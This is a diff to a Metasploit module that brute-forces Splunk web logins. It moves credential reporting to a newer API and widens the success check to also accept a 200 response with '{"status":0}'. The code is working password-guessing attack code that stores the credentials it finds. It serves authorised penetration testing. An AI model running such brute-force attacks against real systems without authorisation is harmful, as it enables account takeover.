@@ -127,6 +127,32 @@ class Metasploit3 < Msf::Auxiliary
     return (res and res.body =~ /Logged in as (.+)/) ? false : true
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: 'splunk-web',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: DateTime.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
 
   #
   # Brute-force the login page
@@ -154,24 +180,22 @@ class Metasploit3 < Msf::Auxiliary
           }
       })
 
-      if not res or res.code != 303
+      if not res
+        vprint_error("FAILED LOGIN. '#{user}' : '#{pass}' returned no response")
+        return :skip_pass
+      end
+
+      unless res.code == 303 || (res.code == 200 && res.body.to_s.index('{"status":0}'))
         vprint_error("FAILED LOGIN. '#{user}' : '#{pass}' with code #{res.code}")
         return :skip_pass
-      else
-        print_good("SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")
-
-        report_hash = {
-          :host   => datastore['RHOST'],
-          :port   => datastore['RPORT'],
-          :sname  => 'splunk-web',
-          :user   => user,
-          :pass   => pass,
-          :active => true,
-          :type => 'password'}
-
-        report_auth_info(report_hash)
-        return :next_user
       end
+
+      print_good("SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")
+      report_cred(ip: datastore['RHOST'], port: datastore['RPORT'], user:user, password: pass, proof: res.code.to_s)
+
+
+      return :next_user
+
     rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
       print_error("HTTP Connection Failed, Aborting")
       return :abort
